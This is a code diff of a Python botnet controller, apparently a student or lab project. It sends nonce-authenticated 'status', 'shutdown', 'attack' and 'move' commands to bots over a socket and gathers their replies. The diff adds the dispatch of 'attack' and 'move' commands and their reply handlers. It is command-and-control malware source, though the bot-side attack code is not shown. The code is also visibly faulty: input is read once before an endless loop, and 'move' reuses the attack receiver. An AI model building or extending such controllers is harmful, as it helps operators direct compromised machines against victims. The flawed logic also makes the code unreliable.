@@ -30,14 +30,11 @@ def parse_args():
 
 def calc_nonce():
     #get random nonce make sure it hasnt been used before
-
-    nonce = uuid.uuid4().hex
-    print("nonce: ", uuid.uuid4().hex)
-    
+    nonce = uuid.uuid4().hex    
     while(nonce in used_nonces):
         nonce = uuid.uuid4().hex
 
-    print("nonce: ", uuid.uuid4().hex)
+    #print("nonce: ", uuid.uuid4().hex)
     used_nonces.append(nonce)
     return nonce
 
@@ -55,12 +52,12 @@ def recieve_status_data(sock: socket):
             response = sock.recv(1024).decode()
             data = response.split()
             bot_status.append(data[1] + " " + data[2])
-            print(response)
+            #print(response)
             j = j + 1       #counts number of bots which sent data back
 
         else:
             #waits for 5 seconds
-            print("waiting")
+            #print("waiting")
             i = i + 1
 
     print("Result: ", j, " bots discovered.")
@@ -86,7 +83,7 @@ def recieve_shutdown_data(sock: socket):
             response = sock.recv(1024).decode()
             data = response.split()
             bot_status.append(data[1])
-            print(response)
+            #print(response)
             j = j + 1       #counts number of bots which sent data back
 
         else:
@@ -102,6 +99,60 @@ def recieve_shutdown_data(sock: socket):
     print(status_string.rstrip(","))
 
 
+def recieve_attack_data(sock: socket):
+    i = 0
+    j = 0
+    bot_attack = list()
+    while i < 5:
+        read_data = [sock]
+        write_data = []
+        error_data = []
+        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
+        if readList:
+            response = sock.recv(1024).decode()
+            #data = response.split()
+            bot_attack.append(response)
+            #print(response)
+            j = j + 1       #counts number of bots which sent data back
+
+        else:
+            #waits for 5 seconds
+            i = i + 1
+
+    print("Result: ", j, " bots discovered.")
+    status_string = ""
+    for bot in bot_attack:
+        status_string = status_string + " " + bot.rstrip("\n") + ","
+        #print(bot)
+    print(status_string.rstrip(","))
+
+
+def recieve_move_data(sock: socket):
+    i = 0
+    j = 0
+    bot_move = list()
+    while i < 5:
+        read_data = [sock]
+        write_data = []
+        error_data = []
+        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
+        if readList:
+            response = sock.recv(1024).decode()
+            #data = response.split()
+            bot_move.append(response)
+            #print(response)
+            j = j + 1       #counts number of bots which sent data back
+
+        else:
+            #waits for 5 seconds
+            i = i + 1
+
+    print("Result: ", j, " bots discovered.")
+    status_string = ""
+    for bot in bot_move:
+        status_string = status_string + " " + bot.rstrip("\n") + ","
+        #print(bot)
+    print(status_string.rstrip(","))
 
 
 def bot_controller(args: str, sock: socket):
@@ -110,19 +161,31 @@ def bot_controller(args: str, sock: socket):
     host = split_hostPort[0]
     port = int(split_hostPort[1])
     secret = args.secret
-    #print("secret: ", secret)
 
     command = input('cmd> ')
-    while (command.lower().strip() != 'close'):
+    while (1):
+
+        # Flush data that was sent from bots
+        #if a bot is created after the controller is turned on then will recieve extra input
+        #response = sock.recv(1024).decode()
+        read_data = [sock]
+        write_data = []
+        error_data = []
+        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
+        if readList:
+            response = sock.recv(1024).decode()
+            print("recieved new data from bots: ")
+            print(response)
+
 
         if command == "status":
-            print("command status")
+            #print("command status")
             nonce = calc_nonce()
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
-            print("mac: ", mac[0:8])
+            #print("mac: ", mac[0:8])
 
             nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
-            print("send command: ", nonce_mac_cmd)
+            #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
             recieve_status_data(sock)
 
@@ -131,18 +194,40 @@ def bot_controller(args: str, sock: socket):
             print("command shutdown")
             nonce = calc_nonce()
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
-            print("mac: ", mac[0:8])
+            #print("mac: ", mac[0:8])
 
             nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
-            print("send command: ", nonce_mac_cmd)
+            #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
 
             recieve_shutdown_data(sock)
 
         elif command[0:6] == "attack":
             print("attack command")
+            nonce = calc_nonce()
+            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
+            #print("mac: ", mac[0:8])
+
+            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            #print("send command: ", nonce_mac_cmd)
+            sock.send(nonce_mac_cmd.encode())
+
+            recieve_attack_data(sock)
+
         elif command[0:4] == "move":
             print("move command")
+            nonce = calc_nonce()
+            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
+            #print("mac: ", mac[0:8])
+
+            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
+            #print("send command: ", nonce_mac_cmd)
+            sock.send(nonce_mac_cmd.encode())
+
+            recieve_attack_data(sock)
+        elif command == "quit":
+            print("Bye.")
+            exit(1)
         else:
             print("unknown command.")
 
